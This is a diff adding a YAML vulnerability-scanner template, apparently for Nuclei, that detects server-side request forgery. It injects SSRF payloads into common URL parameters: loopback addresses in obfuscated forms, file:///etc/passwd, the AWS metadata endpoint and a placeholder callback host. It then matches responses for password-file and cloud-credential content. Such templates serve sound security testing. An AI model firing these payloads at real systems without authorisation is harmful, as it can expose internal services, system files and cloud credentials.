@@ -1,0 +1,78 @@
+id: ssrf-detection
+name: Server-Side Request Forgery (SSRF)
+version: 1.0
+author: GochaOqradze
+severity: high
+description: >
+  Detects SSRF vulnerabilities by injecting internal URLs, cloud metadata
+  endpoints, and file:// protocol URIs into URL-accepting parameters.
+  Checks for indicators of successful internal resource access.
+
+info:
+  cwe-id: CWE-918
+
+tags:
+  - ssrf
+  - injection
+  - server-side
+  - cloud
+
+references:
+  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+variables:
+  collaborator: "your-callback-server.com"
+
+requests:
+  - method: GET
+    path:
+      - "/fetch?url={{payload}}"
+      - "/proxy?url={{payload}}"
+      - "/download?file={{payload}}"
+      - "/load?src={{payload}}"
+      - "/redirect?target={{payload}}"
+      - "/image?url={{payload}}"
+      - "/api/proxy?url={{payload}}"
+
+    redirects: true
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "http://{{collaborator}}/ssrf-test"
+        - "https://{{collaborator}}/ssrf-test"
+        - "file:///etc/passwd"
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/meta-data/ami-id"
+        - "http://127.0.0.1"
+        - "http://localhost"
+        - "http://[::1]"
+        - "http://0177.0.0.1"
+        - "http://0x7f000001"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "ami-id"
+          - "ami-launch-index"
+          - "instance-id.*i-[a-z0-9]+"
+          - "local-hostname"
+          - "security-credentials"
+        condition: or
+
+      - type: word
+        words:
+          - "ami-"
+          - "instance-id"
+          - "/bin/bash"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: aws_metadata
+        regex:
+          - "(ami-[a-z0-9]+)"
+          - "(i-[a-z0-9]+)"
+        group: 1
